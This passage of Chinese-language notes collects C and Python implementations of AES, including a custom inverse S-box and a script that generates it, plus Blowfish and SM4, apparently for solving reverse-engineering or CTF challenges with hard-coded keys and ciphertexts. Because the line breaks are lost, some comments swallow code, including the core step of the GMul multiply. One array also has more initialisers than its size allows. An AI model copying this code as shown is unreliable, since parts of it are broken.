PlainText[k],k++);\t\tprintf(\"\\n当前密文解密之后为：\");\t\tfor (k = 0; k &lt; 16; k++)printf(\"%02X \", PlainText[k]);\t\tprintf(\"\\n\");\t}\tprintf(\"\\n最后一次循环：\");\tShiftRowsRe(PlainText);/*行移位逆*/\tSubBytesRe(PlainText, PlainText1, 16);/*S盒置换*/\tAddRoundKey(PlainText1, CipherKey1);\tprintf(\"\\n最终AES解密后的明文为：\");\tfor (i = 0; i &lt; 16; i++)  printf(\"%02X \", PlainText1[i]);\tprintf(\"\\n\");\tsystem(\"pause\");}\n代码 2//// Created by Liming Shao on 2018/4/24.//#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;typedef struct{    uint32_t eK[44], dK[44];    // encKey, decKey    int Nr; // 10 rounds} AesKey;#define BLOCKSIZE 16#define LOAD32H(x, y) \\  do { (x) = ((uint32_t)((y)[0] &amp; 0xff)&lt;&lt;24) | ((uint32_t)((y)[1] &amp; 0xff)&lt;&lt;16) | \\             ((uint32_t)((y)[2] &amp; 0xff)&lt;&lt;8)  | ((uint32_t)((y)[3] &amp; 0xff));} while(0)#define STORE32H(x, y) \\  do { (y)[0] = (uint8_t)(((x)&gt;&gt;24) &amp; 0xff); (y)[1] = (uint8_t)(((x)&gt;&gt;16) &amp; 0xff);   \\       (y)[2] = (uint8_t)(((x)&gt;&gt;8) &amp; 0xff); (y)[3] = (uint8_t)((x) &amp; 0xff); } while(0)/* extract a byte */#define BYTE(x, n) (((x) &gt;&gt; (8 * (n))) &amp; 0xff)/* used for keyExpansion */#define MIX(x) (((S[BYTE(x, 2)] &lt;&lt; 24) &amp; 0xff000000) ^ ((S[BYTE(x, 1)] &lt;&lt; 16) &amp; 0xff0000) ^ \\                ((S[BYTE(x, 0)] &lt;&lt; 8) &amp; 0xff00) ^ (S[BYTE(x, 3)] &amp; 0xff))#define ROF32(x, n)  (((x) &lt;&lt; (n)) | ((x) &gt;&gt; (32-(n))))#define ROR32(x, n)  (((x) &gt;&gt; (n)) | ((x) &lt;&lt; (32-(n))))/* for 128-bit blocks, Rijndael never uses more than 10 rcon values */static const uint32_t rcon[10] = {        0x01000000UL, 0x02000000UL, 0x04000000UL, 0x08000000UL, 0x10000000UL,        0x20000000UL, 0x40000000UL, 0x80000000UL, 0x1B000000UL, 0x36000000UL};unsigned char S[256] = {        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,        0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,        0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,        0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,        0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,        0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,        0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,        0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,        0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,        0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,        0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,        0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,        0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,        0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,        0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,        0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16};// unsigned char inv_S[256] = {//         0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,//         0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,//         0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,//         0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,//         0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,//         0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,//         0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,//         0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,//         0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,//         0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,//         0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,//         0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,//         0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,//         0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,//         0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,//         0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D// };unsigned char inv_S[256] = {      2, 15, 63, 202, 143, 30, 44, 208, 107, 138, 19, 1, 3, 189, 175, 193, 10, 211, 188, 140, 0, 171, 216, 144, 6, 69, 179, 184, 5, 88, 228, 247, 218, 185, 237, 253, 80, 72, 112, 108, 132, 157, 141, 167, 87, 70, 21, 94, 22, 152, 104, 134, 100, 246, 248, 114, 146, 182, 101, 93, 204, 92, 164, 212, 178, 36, 217, 40, 102, 161, 46, 8, 37, 209, 139, 109, 73, 162, 91, 118, 61, 35, 194, 166, 50, 148, 123, 84, 78, 195, 250, 66, 11, 149, 76, 238, 135, 255, 47, 155, 130, 57, 227, 124, 203, 233, 222, 196, 68, 67, 142, 52, 56, 165, 54, 48, 213, 106, 9, 82, 251, 215, 243, 129, 158, 163, 64, 191, 38, 214, 119, 186, 126, 4, 43, 23, 125, 12, 33, 85, 99, 20, 105, 225, 176, 245, 42, 174, 77, 59, 224, 160, 97, 153, 83, 131, 60, 187, 235, 200, 13, 74, 181, 25, 169, 127, 81, 96, 239, 156, 201, 147, 159, 122, 229, 45, 49, 199, 7, 136, 51, 168, 221, 31, 95, 236, 128, 39, 89, 16, 18, 177, 32, 121, 210, 198, 75, 62, 86, 252, 244, 90, 205, 120, 254, 192, 219, 154, 137, 197, 41, 29, 113, 26, 241, 71, 27, 190, 24, 170, 14, 98, 183, 111, 133, 53, 173, 231, 34, 116, 172, 150, 110, 223, 117, 28, 232, 55, 249, 226, 234, 220, 103, 79, 65, 17, 145, 58, 115, 230, 180, 240, 206, 207, 242, 151};/* copy in[16] to state[4][4] */int loadStateArray(uint8_t (*state)[4], const uint8_t *in) {    for (int i = 0; i &lt; 4; ++i) {        for (int j = 0; j &lt; 4; ++j) {            state[j][i] = *in++;        }    }    return 0;}/* copy state[4][4] to out[16] */int storeStateArray(uint8_t (*state)[4], uint8_t *out) {    for (int i = 0; i &lt; 4; ++i) {        for (int j = 0; j &lt; 4; ++j) {            *out++ = state[j][i];        }    }    return 0;}int keyExpansion(const uint8_t *key, uint32_t keyLen, AesKey *aesKey) {    if (NULL == key || NULL == aesKey){        printf(\"keyExpansion param is NULL\\n\");        return -1;    }    if (keyLen != 16){        printf(\"keyExpansion keyLen = %d, Not support.\\n\", keyLen);        return -1;    }    uint32_t *w = aesKey-&gt;eK;    uint32_t *v = aesKey-&gt;dK;    /* keyLen is 16 Bytes, generate uint32_t W[44]. */    /* W[0-3] */    for (int i = 0; i &lt; 4; ++i) {        LOAD32H(w[i], key + 4*i);    }    /* W[4-43] */    for (int i = 0; i &lt; 10; ++i) {        w[4] = w[0] ^ MIX(w[3]) ^ rcon[i];        w[5] = w[1] ^ w[4];        w[6] = w[2] ^ w[5];        w[7] = w[3] ^ w[6];        w += 4;    }    w = aesKey-&gt;eK+44 - 4;    for (int j = 0; j &lt; 11; ++j) {        for (int i = 0; i &lt; 4; ++i) {            v[i] = w[i];        }        w -= 4;        v += 4;    }    return 0;}int addRoundKey(uint8_t (*state)[4], const uint32_t *key) {    uint8_t k[4][4];    /* i: row, j: col */    for (int i = 0; i &lt; 4; ++i) {        for (int j = 0; j &lt; 4; ++j) {            k[i][j] = (uint8_t) BYTE(key[j], 3 - i);  /* copy uint32 key[4] to uint8 k[4][4] */            state[i][j] ^= k[i][j];        }    }    return 0;}int subBytes(uint8_t (*state)[4]) {    /* i: row, j: col */    for (int i = 0; i &lt; 4; ++i) {        for (int j = 0; j &lt; 4; ++j) {            state[i][j] = S[state[i][j]];        }    }    return 0;}int invSubBytes(uint8_t (*state)[4]) {    /* i: row, j: col */    for (int i = 0; i &lt; 4; ++i) {        for (int j = 0; j &lt; 4; ++j) {            state[i][j] = inv_S[state[i][j]];        }    }    return 0;}int shiftRows(uint8_t (*state)[4]) {    uint32_t block[4] = {0};    /* i: row */    for (int i = 0; i &lt; 4; ++i) {        LOAD32H(block[i], state[i]);        block[i] = ROF32(block[i], 8*i);        STORE32H(block[i], state[i]);    }    return 0;}int invShiftRows(uint8_t (*state)[4]) {    uint32_t block[4] = {0};    /* i: row */    for (int i = 0; i &lt; 4; ++i) {        LOAD32H(block[i], state[i]);        block[i] = ROR32(block[i], 8*i);        STORE32H(block[i], state[i]);    }    return 0;}/* Galois Field (256) Multiplication of two Bytes */uint8_t GMul(uint8_t u, uint8_t v) {    uint8_t p = 0;    for (int i = 0; i &lt; 8; ++i) {        if (u &amp; 0x01) {    //            p ^= v;        }        int flag = (v &amp; 0x80);        v &lt;&lt;= 1;        if (flag) {            v ^= 0x1B; /* x^8 + x^4 + x^3 + x + 1 */        }        u &gt;&gt;= 1;    }    return p;}int mixColumns(uint8_t (*state)[4]) {    uint8_t tmp[4][4];    uint8_t M[4][4] = {{0x02, 0x03, 0x01, 0x01},                       {0x01, 0x02, 0x03, 0x01},                       {0x01, 0x01, 0x02, 0x03},                       {0x03, 0x01, 0x01, 0x02}};    /* copy state[4][4] to tmp[4][4] */    for (int i = 0; i &lt; 4; ++i) {        for (int j = 0; j &lt; 4; ++j){            tmp[i][j] = state[i][j];        }    }    for (int i = 0; i &lt; 4; ++i) {        for (int j = 0; j &lt; 4; ++j) {            state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j])                        ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]);        }    }    return 0;}int invMixColumns(uint8_t (*state)[4]) {    uint8_t tmp[4][4];    uint8_t M[4][4] = {{0x0E, 0x0B, 0x0D, 0x09},                       {0x09, 0x0E, 0x0B, 0x0D},                       {0x0D, 0x09, 0x0E, 0x0B},                       {0x0B, 0x0D, 0x09, 0x0E}};    /* copy state[4][4] to tmp[4][4] */    for (int i = 0; i &lt; 4; ++i) {        for (int j = 0; j &lt; 4; ++j){            tmp[i][j] = state[i][j];        }    }    for (int i = 0; i &lt; 4; ++i) {        for (int j = 0; j &lt; 4; ++j) {            state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j])                          ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]);        }    }    return 0;}int aesEncrypt(const uint8_t *key, uint32_t keyLen, const uint8_t *pt, uint8_t *ct, uint32_t len) {    AesKey aesKey;    uint8_t *pos = ct;    const uint32_t *rk = aesKey.eK;    uint8_t out[BLOCKSIZE] = {0};    uint8_t actualKey[16] = {0};    uint8_t state[4][4] = {0};    if (NULL == key || NULL == pt || NULL == ct){        printf(\"param err.\\n\");        return -1;    }    if (keyLen &gt; 16){        printf(\"keyLen must be 16.\\n\");        return -1;    }    if (len % BLOCKSIZE){        printf(\"inLen is invalid.\\n\");        return -1;    }    memcpy(actualKey, key, keyLen);    keyExpansion(actualKey, 16, &amp;aesKey);    for (int i = 0; i &lt; len; i += BLOCKSIZE) {        loadStateArray(state, pt);        addRoundKey(state, rk);        for (int j = 1; j &lt; 10; ++j) {            rk += 4;            subBytes(state);            shiftRows(state);            mixColumns(state);            addRoundKey(state, rk);        }        subBytes(state);        shiftRows(state);        addRoundKey(state, rk+4);        storeStateArray(state, pos);        pos += BLOCKSIZE;        pt += BLOCKSIZE;        rk = aesKey.eK;    }    return 0;}int aesDecrypt(const uint8_t *key, uint32_t keyLen, const uint8_t *ct, uint8_t *pt, uint32_t len) {    AesKey aesKey;    uint8_t *pos = pt;    const uint32_t *rk = aesKey.dK;    uint8_t out[BLOCKSIZE] = {0};    uint8_t actualKey[16] = {0};    uint8_t state[4][4] = {0};    if (NULL == key || NULL == ct || NULL == pt){        printf(\"param err.\\n\");        return -1;    }    if (keyLen &gt; 16){        printf(\"keyLen must be 16.\\n\");        return -1;    }    if (len % BLOCKSIZE){        printf(\"inLen is invalid.\\n\");        return -1;    }    memcpy(actualKey, key, keyLen);    keyExpansion(actualKey, 16, &amp;aesKey);    for (int i = 0; i &lt; len; i += BLOCKSIZE) {        loadStateArray(state, ct);        addRoundKey(state, rk);        for (int j = 1; j &lt; 10; ++j) {            rk += 4;            invShiftRows(state);            invSubBytes(state);            addRoundKey(state, rk);            invMixColumns(state);        }        invSubBytes(state);        invShiftRows(state);        addRoundKey(state, rk+4);        storeStateArray(state, pos);        pos += BLOCKSIZE;        ct += BLOCKSIZE;        rk = aesKey.dK;    }    return 0;}void printHex(const uint8_t *ptr, int len, char *tag) {    printf(\"%s\\ndata[%d]: \", tag, len);    for (int i = 0; i &lt; len; ++i) {        printf(\"%.2X \", *ptr++);    }    printf(\"\\n\");}void printState(uint8_t (*state)[4], char *tag) {    printf(\"%s\\n\", tag);    for (int i = 0; i &lt; 4; ++i) {        printf(\"%.2X %.2X %.2X %.2X\\n\", state[i][0], state[i][1], state[i][2], state[i][3]);    }    printf(\"\\n\");}int main() {    // case 1    const uint8_t key[16] = { 0x05,0x06,0x07,0x08,0x37,0x42,0x4d,0x58,0x63,0x00,0x0a,0x0c,0x0d,0x0e,0x0f,0x10 };    const uint8_t pt[48]={         0x71,0x55,0x7f,0xa8,0xfa,0x0e,0xa3,0x19,0xa0,0x5c,0xf9,0x0e,0x9b,0x0b,0x5e,0xfc,0xb5,0xa8,0x49,0xfd,0x90,0x99,0x74,0xc7,0x77,0x02,0x6a,0xf5,0x9a,0x6a,0xba,0x7f,0xfb,0xe7,0x68,0xda,0x54,0xee,0xe8,0xbb,0x78,0x01,0xe7,0xbb,0xa2,0x95,0x95,0xfa,0x00,0x00    };    uint8_t ct[48] = {0};    uint8_t plain[48] = {0};     // aesEncrypt(key, 16, pt, ct, 16);    // printHex(pt, 16, \"plain data:\");    // printf(\"expect cipher:\\n39 25 84 1D 02 DC 09 FB DC 11 85 97 19 6A 0B 32\\n\");    // printHex(ct, 16, \"after encryption:\");    aesDecrypt(key, 16, pt, plain, 48);    printHex(plain, 48, \"after decryption:\");    // // case 2    // const uint8_t key2[]=\"1234567890123456\";    // const uint8_t *data = (uint8_t*)\"abcdefghijklmnopqrstuvwxyz123456\";    // uint8_t ct2[32] = {0};    // uint8_t plain2[32] = {0};    // aesEncrypt(key2, 16, data, ct2, 32);    // printf(\"\\nplain text:\\n%s\\n\", data);    // printf(\"expect ciphertext:\\nfcad715bd73b5cb0488f840f3bad7889\\n\");    // printHex(ct2, 32, \"after encryption:\");    // aesDecrypt(key2, 16, ct2, plain2, 32);    // printHex(plain2, 32, \"after decryption:\");    // printf(\"output plain text\\n\");    // for (int i = 0; i &lt; 32; ++i) {    //     printf(\"%c \", plain2[i]);    // }    return 0;}\n\n逆盒脚本#include \"stdio.h\"#include \"stdint.h\"unsigned char S[256] = {    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16};uint8_t INV_S[256] = {};int main() {    for (size_t i = 0; i &lt; 256; i++)    {        // 脱裤子放屁，，， 等于 INV_S[S[i]] = i;        INV_S[(((S[i] &amp; 0xF0) &gt;&gt; 4) &lt;&lt; 4) + (S[i] &amp; 0xF)] = i;    }    for (size_t i = 0; i &lt; 256; i++)    {        printf(\"%x\", INV_S[i]);        if (i &lt; 255) printf(\", \");    }    printf(\"\\n\");        return 0;}\n\nBlowFish// 轮函数DWORD Feistel(DWORD x){\tDWORD h = S[0][x &gt;&gt; 24] + S[1][x &gt;&gt; 16 &amp; 0xff];\treturn (h ^ S[2][x &gt;&gt; 8 &amp; 0xff]) + S[3][x &amp; 0xff];}void encrypt(DWORD&amp; XL, DWORD&amp; XR){\tfor (int i = 0; i &lt; 16; i += 2)\t{\t\tXL ^= P[i];\t\tXR ^= Feistel(XL);\t\tXR ^= P[i + 1];\t\tXL ^= Feistel(XR);\t}\tXL ^= P[16];\tXR ^= P[17];\tswap(XL, XR);}void decrypt(DWORD&amp; XL, DWORD&amp; XR){\tfor (int i = 16; i &gt; 0; i -= 2)\t{\t\tXL ^= P[i + 1];\t\tXR ^= Feistel(XL);\t\tXR ^= P[i];\t\tXL ^= Feistel(XR);\t}\tXL ^= P[1];\tXR ^= P[0];\tswap(XL, XR);}\n\nfrom Crypto.Cipher import Blowfishimport codecsclass BlowfishCipher:    def __init__(self):        pass    def encrypt(self, plaintext, key):        key = key.encode(\"utf-8\")        cipher = Blowfish.new(key, Blowfish.MODE_ECB)                # 将明文填充到8字节的倍数        plaintext = plaintext.ljust((len(plaintext) + 7) // 8 * 8)                ciphertext = cipher.encrypt(plaintext.encode('utf-8'))        hex_encode = codecs.encode(ciphertext, 'hex_codec').decode('utf-8')        return hex_encode    def decrypt(self, ciphertext, key):        key = key.encode(\"utf-8\")        cipher = Blowfish.new(key, Blowfish.MODE_ECB)                ciphertext = codecs.decode(ciphertext, 'hex_codec')        decrypted_text = cipher.decrypt(ciphertext).decode('utf-8').rstrip()        return decrypted_textif __name__ == '__main__':    plaintext = ''    key = 'UzBtZTBuZV9EMGcz'        blowfish_cipher = BlowfishCipher()    encrypted_text='11a51f049550e2508f17e16cf1632b47'    decrypted_text = blowfish_cipher.decrypt(encrypted_text, key)    print(f\"加密: {encrypted_text}, 解密: {decrypted_text}\")\n\nSM4加解密同源\n代码1#include&lt;stdio.h&gt;#define u8 unsigned char#define u32 unsigned long// S盒const u8 Sbox[256] = {\t0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05,\t0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99,\t0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62,\t0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6,\t0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8,\t0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35,\t0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,\t0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,\t0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,\t0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,\t0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,\t0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,\t0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,\t0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,\t0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84,\t0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48};\t// 密钥扩展算法的常数FK const u32 FK[4] = {\t0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc};// 密钥扩展算法的固定参数CK const u32 CK[32] = {\t0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269,\t0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9,\t0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249,\t0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9,\t0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229,\t0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299,\t0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209,\t0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279};u32 functionB(u32 b); // 查S盒的函数B u32 loopLeft(u32 a, short length); // 循环左移函数 u32 functionL1(u32 a); // 线性变换Lu32 functionL2(u32 a); // 线性变换L'u32 functionT(u32 a, short mode); // 合成变换Tvoid extendFirst(u32 MK[], u32 K[]); // 密钥扩展算法第一步void extendSecond(u32 RK[], u32 K[]); // 密钥扩展算法第二步void getRK(u32 MK[], u32 K[], u32 RK[]); // 轮密钥获取算法void iterate32(u32 X[], u32 RK[]); // 迭代算法void reverse(u32 X[], u32 Y[]); // 反转函数 void encryptSM4(u32 X[], u32 RK[], u32 Y[]); // 加密算法void decryptSM4(u32 X[], u32 RK[], u32 Y[]); // 解密算法 /*\t查S盒的函数B \t参数:\tu32 b\t返回值:\t查S盒的结果u32 b*/ u32 functionB(u32 b) {\tu8 a[4];\tshort i;\ta[0] = b / 0x1000000;\ta[1] = b / 0x10000;\ta[2] = b / 0x100;\ta[3] = b;\tb = Sbox[a[0]] * 0x1000000 + Sbox[a[1]] * 0x10000 + Sbox[a[2]] * 0x100 + Sbox[a[3]];\treturn b;}/*\t循环左移算法\t参数：\tu32 a    length：循环左移位数\t返回值：u32 b */u32 loopLeft(u32 a, short length) {\tshort i;\tfor(i = 0; i &lt; length; i++) {\t\ta = a * 2 + a / 0x80000000;\t}\treturn a;}/* \t密钥线性变换函数L\t参数：\tu32 a\t返回值：线性变换后的u32 a\t*/u32 functionL1(u32 a) {\treturn a ^ loopLeft(a, 2) ^ loopLeft(a, 10) ^ loopLeft(a, 18) ^ loopLeft(a, 24);}/* \t密钥线性变换函数L'\t参数：\tu32 a\t返回值：移位操作后的u32 a\t*/u32 functionL2(u32 a) {\treturn a ^ loopLeft(a, 13) ^ loopLeft(a, 23);}/*\t合成变换T\t参数：\tu32 a    short mode：1表示明文的T，调用L；2表示密钥的T，调用L' \t返回值：合成变换后的u32 a */u32 functionT(u32 a, short mode) {\treturn mode == 1 ? functionL1(functionB(a)) : functionL2(functionB(a));} /* \t密钥扩展算法第一步\t参数：\tMK[4]：密钥  K[4]:中间数据，保存结果\t（FK[4]：常数） \t返回值：无 */ void extendFirst(u32 MK[], u32 K[]) {\tint i;\tfor(i = 0; i &lt; 4; i++) {\t\tK[i] = MK[i] ^ FK[i]; \t} }/* \t密钥扩展算法第二步\t参数：\tRK[32]：轮密钥，保存结果    K[4]：中间数据 （CK[32]：固定参数） \t返回值：无*/ void extendSecond(u32 RK[], u32 K[]) {\tshort i;\tfor(i = 0; i &lt;32; i++) {\t\tK[(i+4)%4] = K[i%4] ^ functionT(K[(i+1)%4] ^ K[(i+2)%4] ^ 